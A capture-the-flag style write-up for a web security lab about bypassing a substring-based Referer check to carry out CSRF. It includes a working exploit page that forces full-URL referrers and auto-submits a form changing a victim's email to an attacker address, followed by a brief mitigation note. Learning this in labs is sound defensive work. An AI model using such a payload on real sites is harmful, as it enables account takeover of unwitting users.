# Lab 08 — CSRF with broken Referer validation

> **Expert** · [Official lab](https://portswigger.net/web-security/csrf/bypassing-referer-based-defenses/lab-referer-validation-broken)

**Entry point:** the Referer validation checks that the site's hostname
appears **anywhere** in the header.

## Solution

1. Confirm: removing the Referer → rejected; so the header must stay — but
   only its *content* matters.
2. Make the victim's browser send a Referer containing the lab hostname:
   put it in the exploit **page path** and force full-URL referrers.

   Create the exploit at path `https://YOUR-EXPLOIT-SERVER/YOUR-LAB-ID.web-security-academy.net/`
   (exploit server lets you choose the file path):

```html
<meta name="referrer" content="unsafe-url">
<form action="https://YOUR-LAB-ID.web-security-academy.net/my-account/change-email"
      method="POST">
  <input type="hidden" name="email" value="attacker@evil-you.net">
</form>
<script>document.forms[0].submit();</script>
```

3. The Referer becomes
   `https://YOUR-EXPLOIT-SERVER/YOUR-LAB-ID.web-security-academy.net/...`
   — the hostname substring is present, validation passes — lab solved.

## Mitigation

Parse the Referer properly (origin comparison), never substring matching.
